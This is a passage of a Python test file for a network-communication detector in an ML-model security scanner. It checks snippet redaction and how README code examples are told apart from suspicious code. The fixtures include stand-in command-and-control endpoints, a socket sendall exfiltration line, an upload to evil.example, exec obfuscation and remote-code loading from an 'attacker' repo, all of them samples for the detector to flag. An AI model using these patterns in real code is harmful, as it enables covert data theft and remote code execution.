        data = b"requests.get(timeout=3, # https://docs.example/reference\n)"

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert network_finding["snippet"] == "requests.get"

    def test_network_function_snippets_ignore_header_urls(self) -> None:
        """Header values must not replace the request URL in persisted evidence."""
        data = b'requests.get("https://evil.example/path", headers={"Referer": "https://docs.example/reference"})'

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert network_finding["snippet"] == "requests.get https://evil.example/path"

    @pytest.mark.parametrize(
        ("data", "finding_type", "expected_snippet"),
        [
            (
                b'requests.get("redis://45.33.32.156:6379/0")',
                "network_function",
                "requests.get redis://45.33.32.156:6379/0",
            ),
            (
                b'c2_server = "tcp://evil-c2.com:4444/payload"',
                "cc_pattern",
                "c2_server tcp://evil-c2.com:4444/payload",
            ),
        ],
    )
    def test_network_snippets_preserve_sanitized_non_http_uri_context(
        self,
        data: bytes,
        finding_type: str,
        expected_snippet: str,
    ) -> None:
        findings = NetworkCommDetector().scan(data, "hook.py")
        finding = next(item for item in findings if item["type"] == finding_type)

        assert finding["snippet"] == expected_snippet

    @pytest.mark.parametrize(
        ("data", "finding_type", "expected_snippet"),
        [
            (b'c2_server = "45.33.32.156"', "cc_pattern", "c2_server 45.33.32.156"),
            (
                b'socket.connect(("45.33.32.156", 4444))',
                "network_function",
                "socket.connect 45.33.32.156:4444",
            ),
            (b'c2_server = {"url": "https://evil.example/path"}', "cc_pattern", "c2_server https://evil.example/path"),
            (
                b'c2_server = get_default({"url": "https://evil.example/path"})',
                "cc_pattern",
                "c2_server https://evil.example/path",
            ),
        ],
    )
    def test_network_snippets_preserve_structured_and_bare_endpoint_context_at_finding_limit(
        self,
        data: bytes,
        finding_type: str,
        expected_snippet: str,
    ) -> None:
        findings = NetworkCommDetector({"max_findings": 1}).scan(data, "hook.py")

        assert findings[0]["type"] == finding_type
        assert findings[0]["snippet"] == expected_snippet

    @pytest.mark.parametrize(
        "data",
        [
            b'c2_server = None, docs_url = "https://docs.example/reference"',
            b'c2_server = None, docs_host = "docs.example.com"',
        ],
    )
    def test_cc_pattern_snippets_do_not_cross_into_sibling_assignments(self, data: bytes) -> None:
        findings = NetworkCommDetector({"max_findings": 1}).scan(data, "hook.py")

        assert findings[0]["type"] == "cc_pattern"
        assert findings[0]["snippet"] == "c2_server"

    def test_network_function_snippets_do_not_preserve_bare_endpoint_credentials(self) -> None:
        secret = "45.33.32.156"
        data = f'requests.get(api_key="{secret}")'.encode()

        findings = NetworkCommDetector({"max_findings": 1}).scan(data, "hook.py")

        assert secret not in json.dumps(findings[0], sort_keys=True)

    def test_network_function_snippet_expansion_is_bounded_without_nearby_url_scheme(self) -> None:
        """Incidental matches in long binary blobs should not expand snippets across megabytes."""
        detector = NetworkCommDetector()
        data = b"https://example.com/" + (b"a" * 6000) + b"requests.get("

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        snippet = network_finding["snippet"]

        assert len(snippet) <= 200
        assert "https://example.com" not in snippet

    def test_single_quoted_call_tail_does_not_prevent_path_token_redaction(self) -> None:
        """Call syntax after a URL should not stay attached to the secret token."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"requests.get('https://example.com/path/{path_token}',verify=True)".encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>"
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_cc_pattern_snippets_redact_partial_url_path_tokens(self) -> None:
        """C&C snippets should expand to the URL start before redacting path tokens."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        data = f"https://example.com/download/{path_token}/malware.bin".encode()

        findings = detector.scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>/malware.bin"
        assert cc_finding["snippet"] == "malware https://example.com/download/<redacted>/malware.bin"
        assert path_token not in json.dumps([cc_finding, url_finding], sort_keys=True)

    def test_cc_pattern_snippets_redact_adjacent_credentials(self) -> None:
        """C&C findings should not preserve surrounding credential-bearing bytes."""
        detector = NetworkCommDetector()
        data = b"api_key=C2_ADJACENT_SECRET malware password=C2_PASSWORD_SECRET C2_STANDALONE_SECRET"

        findings = detector.scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")
        serialized = json.dumps(cc_finding, sort_keys=True)

        assert "C2_ADJACENT_SECRET" not in serialized
        assert "C2_PASSWORD_SECRET" not in serialized
        assert "C2_STANDALONE_SECRET" not in serialized
        assert cc_finding["snippet"] == "malware"

    def test_cc_pattern_snippets_preserve_assigned_endpoint_only(self) -> None:
        """C&C key assignments may retain their sanitized endpoint without neighboring URLs."""
        data = b'https://docs.example/reference c2_server = "https://evil.example/path?token=SECRET"'

        findings = NetworkCommDetector().scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")

        assert cc_finding["snippet"] == "c2_server https://evil.example/path"

    def test_cc_pattern_snippets_support_triple_quoted_assigned_endpoints(self) -> None:
        """Triple-quoted C2 assignments should retain only sanitized endpoint context."""
        data = b'c2_server = """https://evil.example/path?token=SECRET"""'

        findings = NetworkCommDetector().scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")

        assert cc_finding["snippet"] == "c2_server https://evil.example/path"
        assert "SECRET" not in json.dumps(cc_finding, sort_keys=True)

    def test_cc_pattern_after_single_quoted_url_is_not_treated_as_path_content(self) -> None:
        """Compact source syntax must not make a later C&C token part of the URL span."""
        data = b"'https://docs.example/reference',malware=1"

        findings = NetworkCommDetector().scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")

        assert cc_finding["snippet"] == "malware"

    def test_explicit_ml_model_url_patterns_redact_signed_query_material(self) -> None:
        detector = NetworkCommDetector()
        token = "TOP_SECRET_QUERY"
        signature = "SIGSECRET1234567890"
        data = f"callback = 'https://collector.example/upload?token={token}&X-Amz-Signature={signature}'".encode()

        findings = detector.scan(data, "payload.pt")

        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
        serialized = json.dumps(explicit_finding, sort_keys=True)
        assert token not in serialized
        assert signature not in serialized
        assert explicit_finding["matched_text"] == "https://collector.example/upload"
        assert explicit_finding["message"] == "Explicit network pattern in ML model: https://collector.example/upload"

    def test_explicit_ml_model_url_patterns_keep_benign_url_context(self) -> None:
        detector = NetworkCommDetector()
        data = b"source = https://example.com/models/checkpoint.bin"

        findings = detector.scan(data, "payload.pt")

        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
        assert explicit_finding["matched_text"] == "https://example.com/models/checkpoint.bin"
        assert explicit_finding["message"].endswith("https://example.com/models/checkpoint.bin")

    def test_cc_pattern_snippet_url_expansion_is_bounded(self) -> None:
        """Long whitespace-free binary regions should not force unbounded URL scans."""
        detector = NetworkCommDetector()
        long_prefix = "a" * 6000
        data = f"https://example.com/{long_prefix}/malware.bin".encode()

        findings = detector.scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")

        assert cc_finding["pattern"] == "malware"
        assert len(cc_finding["snippet"]) < 200

    def test_network_functions_not_flagged_in_documentation_metadata_context(self) -> None:
        """Documentation prose should not report raw network library/function token mentions."""
        detector = NetworkCommDetector()
        data = b"This README says: import socket, requests.get, and urlopen are shown for examples."

        findings = detector.scan(data, "model_card.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "image_url",
        [
            "https://huggingface.co/spaces/ds4sd/demo/resolve/main/examples/sample.png",
            "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/car.jpg?download=true",
            "https://HuggingFace.CO/spaces/ds4sd/demo/resolve/main/examples/sample.png",
        ],
    )
    @pytest.mark.parametrize("context", ["README.md", "README", "README.en.md", "README.markdown", "README.rst"])
    def test_readme_python_example_official_sample_image_has_no_network_false_positive(
        self,
        image_url: str,
        context: str,
    ) -> None:
        data = (
            "# Model card\n\n```python\nimport requests\n"
            f"image_url = {image_url!r}\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, context)

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
        assert any(finding["type"] == "cloud_storage_url" for finding in findings)

    @pytest.mark.parametrize(
        ("opening", "closing"),
        [("```", "````"), ("````", "````"), ("````", "`````"), ("~~~", "~~~~"), ("~~~~", "~~~~")],
    )
    def test_readme_python_example_accepts_valid_longer_fence_closers(self, opening: str, closing: str) -> None:
        data = (
            f"{opening}python\nimport requests\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "requests.get(image_url, stream=True)\n"
            f"{closing}\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_python_example_rejects_shorter_fence_closers(self) -> None:
        data = (
            b"````python\nimport requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_accepts_constant_annotated_url_binding(self) -> None:
        data = (
            b"```python\nimport requests\n"
            b"image_url: str = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "image_url",
        [
            "http://huggingface.co/org/model/resolve/main/sample.png",
            "https://evil.example.org/sample.png",
            "https://huggingface.co.evil.example.org/sample.png",
            "https://hf.co/org/model/resolve/main/sample.png",
            "https://huggingface.co/org/model/resolve/main/payload.py",
            "https://huggingface.co/org/model/resolve/main/sample.png?next=https://evil.example.org/payload",
        ],
    )
    def test_readme_python_example_preserves_untrusted_image_network_detection(
        self,
        image_url: str,
    ) -> None:
        data = (
            "```python\nimport requests\n"
            f"image_url = {image_url!r}\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_preserves_mixed_untrusted_requests(self) -> None:
        data = (
            b"```python\nimport requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n"
            b"requests.post('https://evil.example.org/upload')\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "mutator",
        [
            "for image_url in [input()]:\n    requests.get(image_url, stream=True)",
            "image_url: str = input()\nrequests.get(image_url, stream=True)",
            "(image_url := input())\nrequests.get(image_url, stream=True)",
            "def load(image_url):\n    requests.get(image_url, stream=True)",
            "requests = payload\nrequests.get(image_url, stream=True)",
            "requests.get(image_url)",
            "requests.get(image_url, stream=True, proxies=payload)",
            "requests.get = payload\nrequests.get(image_url, stream=True)",
            "setattr(requests, 'get', payload)\nrequests.get(image_url, stream=True)",
            "fetch = requests.get\nrequests.get(image_url, stream=True)\nfetch(input())",
            "from requests import post\nrequests.get(image_url, stream=True)\npost(input())",
            "import attacker as requests\nrequests.get(image_url, stream=True)",
            "from attacker import requests\nrequests.get(image_url, stream=True)",
            "from attacker import *\nrequests.get(image_url, stream=True)",
            "vars(requests)['get'] = payload\nrequests.get(image_url, stream=True)",
            "object.__setattr__(requests, 'get', payload)\nrequests.get(image_url, stream=True)",
            "class requests:\n    get = payload\nrequests.get(image_url, stream=True)",
            "import sys\nsys.modules['requests'] = payload\nrequests.get(image_url, stream=True)",
            "fetch = __import__('requests').post\nrequests.get(image_url, stream=True)\nfetch(input())",
            "match [payload]:\n    case [*requests]:\n        requests.get(image_url, stream=True)",
            "match payload:\n    case {'x': _, **image_url}:\n        requests.get(image_url, stream=True)",
            "@mutate\ndef placeholder():\n    pass\nrequests.get(image_url, stream=True)",
            "class Hook(metaclass=mutate):\n    pass\nrequests.get(image_url, stream=True)",
            (
                "import importlib\nfetch = importlib.import_module('requests').post\n"
                + "requests.get(image_url, stream=True)\nfetch(input())"
            ),
            "del requests\nrequests.get(image_url, stream=True)",
            "del image_url\nrequests.get(image_url, stream=True)",
            "requests.get(image_url, stream=True)\nmatch payload:\n    case image_url:\n        fetch(image_url)",
            "builtins.exec('requests.get(input())')\nrequests.get(image_url, stream=True)",
            "namespace['exec']('requests.get(input())')\nrequests.get(image_url, stream=True)",
            "from attacker import endpoint as image_url\nrequests.get(image_url, stream=True)",
            "import attacker as image_url\nrequests.get(image_url, stream=True)",
            "replace_requests_get()\nrequests.get(image_url, stream=True)",
            "from attacker import install_hook\ninstall_hook()\nrequests.get(image_url, stream=True)",
            "__builtins__['ex' + 'ec']('requests.get(input())')\nrequests.get(image_url, stream=True)",
            "import attacker\nrequests.get(image_url, stream=True)",
            "import attacker\nattacker.install()\nrequests.get(image_url, stream=True)",
            "import attacker as print\nprint()\nrequests.get(image_url, stream=True)",
            "requests.get(image_url, stream=True)\nplugin.activate()",
            "response = requests.get(image_url, stream=True)\nresponse.exfiltrate()",
            "requests.get(image_url, stream=True).raw.exfiltrate()",
            "requests.get(image_url, stream=True).raw.connection.sock.sendall(b'secret')",
            "requests.get(image_url, stream=True).raw.connection.request('POST', '/upload', body='secret')",
            "requests.get(image_url, stream=True).raw[0].send(image_url)",
            "print.__self__.__dict__['ex' + 'ec']('requests.get = print')\nrequests.get(image_url, stream=True)",
            (
                "assert print.__self__.__dict__['ex' + 'ec']('requests.get = print') is None\n"
                + "requests.get(image_url, stream=True)"
            ),
            "torch.ops.load_library('payload.so')\nrequests.get(image_url, stream=True)",
            "torch.load('payload.pt', weights_only=False)\nrequests.get(image_url, stream=True)",
            "torch.distributed.init_process_group('gloo')\nrequests.get(image_url, stream=True)",
            "Image.open('payload.tif')\nrequests.get(image_url, stream=True)",
            (
                "from transformers import AutoModel\n"
                "AutoModel.from_pretrained('attacker/model', trust_remote_code=True)\n"
                "requests.get(image_url, stream=True)"
            ),
            "os = 1\nos.system('payload')\nrequests.get(image_url, stream=True)",
            (
                "response = requests.get(image_url, stream=True)\nalias = response\n"
                "alias.raw.connection.sock.sendall(b'x')"
            ),
            "raw = requests.get(image_url, stream=True).raw\nraw.connection.sock.sendall(b'x')",
            "with requests.get(image_url, stream=True) as response:\n    response.raw.connection.sock.sendall(b'x')",
            "(response := requests.get(image_url, stream=True)).raw.connection.sock.sendall(b'x')",
            "responses = [requests.get(image_url, stream=True)]\nresponses[0].raw.connection.sock.sendall(b'x')",
            "(lambda: payload)()\nrequests.get(image_url, stream=True)",
        ],
    )
    def test_readme_python_example_preserves_rebound_or_unproven_requests(
        self,
        mutator: str,
    ) -> None:
        data = (
            "```python\nimport requests\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            f"{mutator}\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "remote_code_argument",
        [
            "trust_remote_code=1",
            "trust_remote_code='true'",
            "trust_remote_code=not False",
            "trust_remote_code=allow_remote_code",
            "**{'trust_remote_code': True}",
            "**remote_options",
            "custom_generate='attacker/repo'",
            "**{'custom_generate': 'attacker/repo'}",
        ],
    )
    def test_readme_python_example_rejects_truthy_or_dynamic_remote_code_trust(
        self,
        remote_code_argument: str,
    ) -> None:
        remote_code_binding = ""
        if remote_code_argument == "trust_remote_code=allow_remote_code":
            remote_code_binding = "allow_remote_code = True\n"
        elif remote_code_argument == "**remote_options":
            remote_code_binding = "remote_options = {'trust_remote_code': True}\n"
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            f"{remote_code_binding}"
            f"AutoModel.from_pretrained('attacker/model', {remote_code_argument})\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "generate_argument",
        [
            "custom_generate='attacker/repo'",
            "custom_generate='attacker/repo', trust_remote_code=True",
            "**{'custom_generate': 'attacker/repo'}",
            "**{'trust_remote_code': True}",
        ],
    )
    def test_readme_python_example_rejects_remote_code_through_generate(
        self,
        generate_argument: str,
    ) -> None:
        """`from_pretrained` is not the only call that loads remote code.

        Since Transformers 4.55 `generate(custom_generate=...)` downloads and executes Hub-hosted
        Python, and `generate` is a documented call, so gating only `from_pretrained` left the
        suppression reachable through it.
        """
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"model.generate({generate_argument})\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        ("binding", "generate_argument"),
        [
            ("remote_options = {'custom_generate': 'attacker/repo'}\n", "**remote_options"),
            (
                "remote_key = 'custom_generate'\nremote_options = {remote_key: 'attacker/repo'}\n",
                "**remote_options",
            ),
        ],
    )
    def test_readme_python_example_rejects_unproven_generate_kwargs(
        self,
        binding: str,
        generate_argument: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{binding}"
            f"model.generate({generate_argument})\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "generate_arguments",
        [
            "None, None, None, None, None, None, None, None, None, None, 'attacker/repo'",
            "None, None, None, None, None, None, None, None, None, None, None, 'attacker/repo'",
        ],
        ids=["transformers-v5", "transformers-v4"],
    )
    def test_readme_python_example_rejects_positional_custom_generate(self, generate_arguments: str) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"model.generate({generate_arguments})\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_allows_v4_positional_use_model_defaults(self) -> None:
        """Transformers v4 position 10 is `use_model_defaults`, not `custom_generate`."""
        data = (
            b"```python\nimport requests\nfrom transformers import AutoModel\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"model.generate(None, None, None, None, None, None, None, None, None, None, True)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_python_example_bounds_repeated_mapping_expansion(self) -> None:
        """Repeated safe mapping expansion must stay linear in the unique AST."""
        mapping_bindings = ["options_0 = {'custom_generate': None}"]
        mapping_bindings.extend(
            f"options_{index} = {{**options_{index - 1}, **options_{index - 1}}}" for index in range(1, 31)
        )
        mapping_source = "\n".join(mapping_bindings)
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{mapping_source}\n"
            "model.generate(**options_30)\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_python_example_rejects_cyclic_generate_kwargs_mapping(self) -> None:
        """Memoization must not turn cyclic mapping provenance into a trusted value."""
        data = (
            b"```python\nimport requests\nfrom transformers import AutoModel\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"options_a = {**options_b}\n"
            b"options_b = {**options_a}\n"
            b"model.generate(**options_a)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "remote_call",
        [
            "model.generate(**options)",
            "AutoModel.from_pretrained('official/model', **options)",
        ],
    )
    def test_readme_python_example_rejects_shadowed_remote_code_options(self, remote_call: str) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "options = {'custom_generate': None}\n"
            f"def run(options):\n    {remote_call}\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "mutation",
        [
            ("for options['custom_generate'] in ['attacker/repo']:\n    model.generate(**options)\n"),
            "[model.generate(**options) for options['custom_generate'] in ['attacker/repo']]\n",
            ("alias = options\nfor alias['custom_generate'] in ['attacker/repo']:\n    model.generate(**options)\n"),
            (
                "alias: 'mapping' = options\n"
                "for alias['custom_generate'] in ['attacker/repo']:\n"
                "    model.generate(**options)\n"
            ),
            (
                "first_alias = options\n"
                "alias = first_alias\n"
                "for alias['custom_generate'] in ['attacker/repo']:\n"
                "    model.generate(**options)\n"
            ),
            (
                "alias = first_alias = options\n"
                "for alias['custom_generate'] in ['attacker/repo']:\n"
                "    model.generate(**options)\n"
            ),
            (
                "if True:\n"
                "    alias = options\n"
                "    for alias['custom_generate'] in ['attacker/repo']:\n"
                "        model.generate(**options)\n"
            ),
            "model.generate(**options); options = {'custom_generate': 'attacker/repo'}\n",
            (
                "alias = options\n"
                "for _ in range(2):\n"
                "    model.generate(**options)\n"
                "    for alias['custom_generate'] in ['attacker/repo']:\n"
                "        pass\n"
            ),
        ],
        ids=[
            "for-target",
            "comprehension-target",
            "aliased-for-target",
            "annotated-alias-for-target",
            "chained-alias-for-target",
            "chained-assignment-for-target",
            "nested-alias-for-target",
            "same-line-rebind-after-call",
            "loop-alias-mutation-after-call",
        ],
    )
    def test_readme_python_example_rejects_mutated_remote_code_options(self, mutation: str) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "options = {'custom_generate': None}\n"
            f"{mutation}"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_allows_documented_generate_kwargs_unpacking(self) -> None:
        """`model.generate(**inputs)` is the canonical documented pattern and must stay benign."""
        data = (
            b"```python\nimport requests\nfrom transformers import AutoModel\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"inputs = {'input_ids': 1}\n"
            b"model.generate(**inputs)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_python_example_allows_non_mutating_generate_kwargs_read(self) -> None:
        """Reading a proven mapping's length does not expose it to mutation."""
        data = (
            b"```python\nimport requests\nfrom transformers import AutoModel\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"options = {'input_ids': 1}\n"
            b"print(len(options))\n"
            b"model.generate(**options)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "operation",
        [
            "print(options)\n",
            "options['custom_generate'] = 'attacker/repo'\n",
            "len = print\nprint(len(options))\n",
        ],
        ids=["leaked-mapping", "mapping-mutation", "rebound-len"],
    )
    def test_readme_python_example_rejects_unsafe_generate_kwargs_use_before_call(
        self,
        operation: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "options = {'input_ids': 1}\n"
            f"{operation}"
            "model.generate(**options)\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_allows_processor_generate_kwargs_unpacking(self) -> None:
        """A canonical Transformers processor output is a trusted model-input mapping."""
        data = (
            b"```python\nimport requests\nfrom PIL import Image\n"
            b"from transformers import AutoModel, AutoProcessor\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"image = Image.open(requests.get(image_url, stream=True).raw)\n"
            b"processor = AutoProcessor.from_pretrained('official/model')\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"inputs = processor(images=image, return_tensors='pt')\n"
            b"model.generate(**inputs)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        ("factory_name", "instance_name", "mapping_expression"),
        [
            ("AutoProcessor", "processor", "processor(images=image, return_tensors='pt')"),
            (
                "AutoProcessor",
                "processor",
                "processor(images=image, return_tensors='pt').to(device='cuda')",
            ),
            ("AutoTokenizer", "tokenizer", "tokenizer('hello', return_tensors='pt')"),
            (
                "AutoFeatureExtractor",
                "feature_extractor",
                "feature_extractor(images=image, return_tensors='pt')",
            ),
        ],
        ids=["processor-output", "processor-output-device-transfer", "tokenizer-output", "feature-output"],
    )
    def test_readme_python_example_allows_inline_transformers_mapping_generate_kwargs(
        self,
        factory_name: str,
        instance_name: str,
        mapping_expression: str,
    ) -> None:
        """A canonical inline Transformers mapping is trusted model input."""
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            f"from transformers import AutoModel, {factory_name}\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            f"{instance_name} = {factory_name}.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"model.generate(**{mapping_expression})\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert not [
            finding
            for finding in findings
            if finding["type"] in {"network_library", "network_function"}
            and finding["severity"] in {"HIGH", "CRITICAL"}
        ]
        assert all(finding["severity"] == "INFO" for finding in findings)

    @pytest.mark.parametrize(
        ("setup", "generate_statement"),
        [
            ("", "model.generate(**model(images=image, return_tensors='pt'))\n"),
            ("", "model.generate(**processor(images=image, return_tensors='pt', trust_remote_code=True))\n"),
            (
                "processor_options = image\n",
                "model.generate(**processor(**processor_options))\n",
            ),
            (
                "processor_options = {'images': image, 'return_tensors': 'pt'}\n"
                "alias = processor_options\n"
                "alias |= {'trust_remote_code': True}\n",
                "model.generate(**processor(**processor_options))\n",
            ),
            ("processor = model\n", "model.generate(**processor(images=image, return_tensors='pt'))\n"),
            (
                "",
                "model.generate(**processor(images=image, return_tensors='pt').to(device=image.mode))\n",
            ),
            (
                "",
                "model.generate(**processor(images=image, return_tensors='pt').to('cpu', 'cuda'))\n",
            ),
            (
                "",
                "deferred = (model.generate(**processor(images=image, return_tensors='pt')) for _ in range(1))\n"
                "processor = model\n",
            ),
        ],
        ids=[
            "unsafe-factory",
            "remote-code-option",
            "dynamic-kwargs",
            "mutated-kwargs-alias",
            "rebound-processor",
            "dynamic-device",
            "extra-device-argument",
            "deferred-processor-rebind",
        ],
    )
    def test_readme_python_example_rejects_unproven_inline_processor_generate_kwargs(
        self,
        setup: str,
        generate_statement: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
